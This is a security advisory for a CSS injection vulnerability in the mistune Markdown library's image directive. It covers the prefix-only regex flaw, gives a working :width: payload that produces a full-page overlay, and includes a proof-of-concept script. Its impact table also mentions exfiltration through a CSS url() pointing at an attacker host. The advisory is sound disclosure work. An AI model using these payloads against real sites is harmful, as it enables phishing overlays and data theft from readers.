# [M] Mistune Image Directive CSS Injection Vulnerability

## Summary
Severity: Medium
Advisory: GHSA-ccfx-mfmx-2fx9
CVE: CVE-2026-44899
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-ccfx-mfmx-2fx9
Type: github-advisory

## Affected
- PyPI: `mistune` — affected >=3.2.0 <3.2.1

## Details
## Summary
The Image directive plugin validates the `:width:` and `:height:` options with a regex compiled as `_num_re = re.compile(r"^\d+(?:\.\d*)?")`. This pattern is applied via `re.match()` (which anchors only at the **start** of the string, not the end). Any value that begins with one or more digits passes validation, regardless of what follows.

When the validated value is not a plain integer, `render_block_image()` inserts it directly into a `style="width:...;"` or `style="height:...;"` attribute. Because the value was accepted by the prefix-only regex, any CSS after the leading digits reaches the `style=` attribute verbatim and without escaping.

An attacker can therefore inject an arbitrary chain of CSS properties — including `position:fixed`, `background-color`, `z-index`, `outline`, and `opacity` — using nothing more than a single `:width:` option in a fenced image directive. The resulting element can visually cover the entire browser viewport, enabling full-page phishing overlays and UI redressing attacks.

## Details
**File:** `src/mistune/directives/image.py`

```python
_num_re = re.compile(r"^\d+(?:\.\d*)?")   # no $ anchor — prefix match only

def _parse_attrs(options):
    height = options.get("height")
    width  = options.get("width")
    if height and _num_re.match(height):   # passes if value STARTS with a digit
        attrs["height"] = height           # full value stored, not just digits
    if width and _num_re.match(width):     # same — prefix-only check
        attrs["width"] = width
```

And in `render_block_image()`:

```python
if width:
    if width.isdigit():
        img += ' width="' + width + '"'   # safe: integer → HTML attribute
    else:
        style += "width:" + width + ";"   # UNSAFE: non-integer → raw style value
```

The `isdigit()` branch correctly uses an HTML attribute for plain integers. The `else` branch assumes that anything that passed `_num_re.match()` is a safe CSS length like `100px` or `50%`. However, because the regex is prefix-only, `100vw;height:100vh;position:fixed;...` also passes, and the entire string lands in `style=` unmodified.


## PoC
**Step 1 — Establish the baseline (safe plain-integer dimensions)**

The script creates a parser with `escape=True`, `FencedDirective`, and the `Image` plugin. A safe image directive is rendered with integer `width` and `height`:

```python
md = create_markdown(escape=True, plugins=[FencedDirective([Image()])])

bl_src = (
    "```{image} photo.jpg\n"
    ":width: 400\n"
    ":height: 300\n"
    ":alt: safe image\n"
    "```\n"
)
bl_out = str(md(bl_src))
```

Expected and actual output — clean `width=` and `height=` HTML attributes, no `style=`:
```html
<div class="block-image"><img src="photo.jpg" alt="safe image" width="400" height="300" /></div>
```

**Step 2 — Understand why non-integer widths go into `style=`**

When `width` is not a plain integer (e.g., `100px`), `width.isdigit()` returns `False`, so the render path falls through to `style += "width:" + width + ";"`. This is the intended mechanism for CSS-unit dimensions. The flaw is that `_num_re.match()` lets far more than CSS units through.

**Step 3 — Craft the exploit payload**

Provide a `:width:` value that begins with a valid number (satisfying `_num_re.match()`) but appends an entire CSS attack chain after it:

```
:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93
```

- `100vw` — starts with `1`, passes `_num_re.match()`; also sets the width to full viewport width
- `;height:100vh` — overrides height to full viewport height
- `;position:fixed` — lifts element out of document flow, fixed to the browser viewport
- `;top:0;left:0` — anchors overlay to the top-left corner
- `;z-index:9999` — places it above all other page content
- `;background-color:#e11d48` — fills the overlay with vivid crimson
- `;outline:8px solid #facc15` — adds a bright yellow border
- `;color:#fff;opacity:.93` — styles the alt-text label in white with near-full opacity

Full exploit markdown:
```
```{image} x.jpg
:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93
:alt: ⚠ CSS INJECTED — click to dismiss ⚠
```
```

**Step 4 — Observe the injected `style=` in the output**

```python
ex_src = (
    "```{image} x.jpg\n"
    ":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;"
    "background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n"
    ":alt: ⚠ CSS INJECTED — click to dismiss ⚠\n"
    "```\n"
)
ex_out = str(md(ex_src))
```

Actual output:
```html
<div class="block-image"><img src="x.jpg" alt="⚠ CSS INJECTED — click to dismiss ⚠" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93;" /></div>
```

Every injected CSS property is present in the `style=` attribute. When a browser renders this HTML, the `<img>` element:
- expands to fill 100% of the viewport width and height
- sits fixed at the top-left corner, scrolling with the viewport
- is coloured crimson with a yellow outline
- appears above all other page content

The result is a complete full-page phishing overlay generated from a single Markdown image directive.

### Script 

I have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.

```python
#!/usr/bin/env python3
"""H6: Image directive CSS injection — width/height use prefix-only re.match().

Exploit combines: position:fixed  +  background-color  +  outline colour
→ a full-viewport coloured overlay injected via a single :width: option.
"""
import os, html as h
from mistune import create_markdown
from mistune.directives import FencedDirective
from mistune.directives.image import Image

md = create_markdown(escape=True, plugins=[FencedDirective([Image()])])

# --- baseline ---
bl_file = "baseline_h6.md"
bl_src  = (
    "```{image} photo.jpg\n"
    ":width: 400\n"
    ":height: 300\n"
    ":alt: safe image\n"
    "```\n"
)
with open(os.path.join(os.getcwd(), bl_file), "w") as f:
    f.write(bl_src)
bl_out = str(md(bl_src))

print(f"[{bl_file}]\n{bl_src}")
print("[output — clean width/height attributes, no style injection]")
print(bl_out)

# --- exploit ---
# _num_re.match() is prefix-only (no $ anchor), so anything after the leading
# digits is accepted and written verbatim into style="width:<value>;".
# This single :width: value smuggles a full CSS attack chain:
#   position:fixed  → overlay sits above the entire page
#   top/left/width/height → covers 100 % of the viewport
#   background-color:#e11d48 → vivid crimson fill
#   outline:8px solid #facc15 → bright yellow border
#   color:#fff → white alt-text label
#   z-index:9999 → on top of everything
ex_file = "exploit_h6.md"
ex_src  = (
    "```{image} x.jpg\n"
    ":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;"
    "background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n"
    ":alt: ⚠ CSS INJECTED — click to dismiss ⚠\n"
    "```\n"
)
with open(os.path.join(os.getcwd(), ex_file), "w") as f:
    f.write(ex_src)
ex_out = str(md(ex_src))

print(f"[{ex_file}]\n{ex_src}")
print("[output — colour + background-colour + fixed overlay injected into style=]")
print(ex_out)

# --- HTML report ---
CSS = """
body{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}
h1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}
p.desc{color:#555;font-size:.9em;margin-top:6px}
.warn{background:#fffbeb;border:1px solid #fbbf24;border-radius:6px;padding:10px 16px;
      font-size:.85em;color:#92400e;margin:12px 0}
.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;
      box-shadow:0 1px 4px rgba(0,0,0,.1)}
.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}
.baseline .case-header{background:#d1fae5;color:#065f46}
.exploit  .case-header{background:#fee2e2;color:#7f1d1d}
.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}
.panel{padding:16px}
.panel+.panel{border-left:1px solid #eee}
.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}
pre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;
    font-size:.78em;white-space:pre-wrap;word-break:break-all}
.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}
.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;
          background:#fff;font-size:.9em;position:relative;overflow:hidden;height:180px}
/* scope the live-render sandbox so position:fixed stays inside the box */
.sandbox{position:relative;width:100%;height:100%}
.sandbox img{max-width:100%;max-height:100%;object-fit:contain}
/* override position:fixed on exploit img to keep it inside the preview box */
.sandbox img[style*="position:fixed"]{position:absolute!important;width:100%!important;
  height:100%!important;top:0!important;left:0!important}
"""

def case(kind, label, filename, src, out):
    header = "BASELINE" if kind == "baseline" else "EXPLOIT"
    sandbox = f'<div class="sandbox">{out}</div>'
    return f"""
<div class="case {kind}">
  <div class="case-header">{header} — {h.escape(label)}</div>
  <div class="panels">
    <div class="panel">
      <h3>Input — {h.escape(filename)}</h3>
      <pre>{h.escape(src)}</pre>
    </div>
    <div class="panel">
      <h3>Output — HTML source</h3>
      <pre>{h.escape(out)}</pre>
      <div class="rlabel">↓ live render (sandboxed to preview box)</div>
      <div class="rendered">{sandbox}</div>
    </div>
  </div>
</div>"""

page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>H6 — Image CSS Injection</title><style>{CSS}</style></head><body>
<h1>H6 — Image Directive CSS Injection</h1>
<p class="desc">
  <code>_parse_attrs()</code> in <code>directives/image.py</code> validates
  <code>:width:</code> / <code>:height:</code> with <code>_num_re.match()</code>
  (prefix-only — no <code>$</code> anchor). Anything after the leading digits
  is accepted verbatim and written straight into a <code>style=</code> attribute.
  A single <code>:width:</code> option is sufficient to smuggle an arbitrary
  CSS chain: <strong>position:fixed · background-color · outline colour · full-viewport overlay</strong>.
</p>
<div class="warn">
  ⚠ The EXPLOIT preview below is sandboxed inside its box.
  In a real document the crimson overlay would cover the <em>entire browser window</em>.
</div>
{case("baseline",
      "Integer dims → clean width/height= attributes, no style=",
      bl_file, bl_src, bl_out)}
{case("exploit",
      ":width: carries position:fixed + background-color + outline → full-viewport coloured overlay",
      ex_file, ex_src, ex_out)}
</body></html>"""

out_path = os.path.join(os.getcwd(), "report_h6.html")
with open(out_path, "w") as f:
    f.write(page)
print(f"\n[report] {out_path}")
```

Example usage:
```bash
python poc.py
```

Once you run the script, open `report_h6.html` in the browser and observe the behaviour.

## Impact
| Dimension        | Assessment |
|------------------|-----------|
| **Confidentiality** | CSS-based data exfiltration via `background-image: url(https://attacker.com/?leak=...)` is possible in some browser/CSP configurations |
| **Integrity**    | Full-viewport overlay enables complete UI replacement: phishing login forms, fake alerts, click-jacking, brand impersonation |
| **Availability** | The overlay obscures all page content from the user until dismissed or navigated away |

**Real-world impact scenario:** An attacker posts a Markdown document to a platform (wiki, issue tracker, documentation site) that renders mistune with the Image directive. Any user who views the page sees a full-screen crimson overlay matching the attacker's design, replacing or concealing the legitimate page content. The overlay can contain a convincing login prompt, survey form, or urgent warning designed to capture credentials.

## References
- https://github.com/lepture/mistune/security/advisories/GHSA-ccfx-mfmx-2fx9
- https://nvd.nist.gov/vuln/detail/CVE-2026-44899
- https://github.com/lepture/mistune
- https://github.com/lepture/mistune/releases/tag/v3.2.1
